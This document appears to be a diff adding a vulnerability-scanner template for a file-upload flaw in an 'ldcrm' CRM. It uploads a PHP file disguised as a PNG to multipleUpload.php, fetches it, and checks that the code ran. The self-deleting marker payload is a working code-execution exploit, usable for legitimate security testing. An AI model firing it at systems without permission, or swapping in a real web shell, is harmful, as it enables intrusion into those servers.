@@ -1,0 +1,48 @@
+id: ldcrm-multipleUpload-fileup
+
+info:
+  name: ldcrm-multipleUpload-fileup
+  author: ldcrm-multipleUpload-fileup
+  severity: Critical
+
+variables:
+  filename: "{{to_lower(rand_base(6))}}"
+  boundary: "{{to_lower(rand_base(26))}}"
+
+http:
+  - raw:
+      - |
+        POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept:*/*
+        Accept-Encoding:gzip, deflate, br
+        Connection:close
+        Content-Length:242
+        Content-Type:multipart/form-data; boundary=---------------------------{{boundary}}
+        Cookie:PHPSESSID=q8n9njtnr88vintfeads41j8og
+        User-Agent:python-requests/2.32.3
+
+        -----------------------------{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
+        Content-Type: image/png
+
+        <?php echo 'holetest';unlink(__FILE__);?>
+        -----------------------------{{boundary}}--
+
+      - |
+        GET /crm/{{url}}{{filename}}.php HTTP/1.1
+        Connection: close
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: url
+        part: body_1
+        internal: true
+        json:
+          - .path
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_2,'holetest')
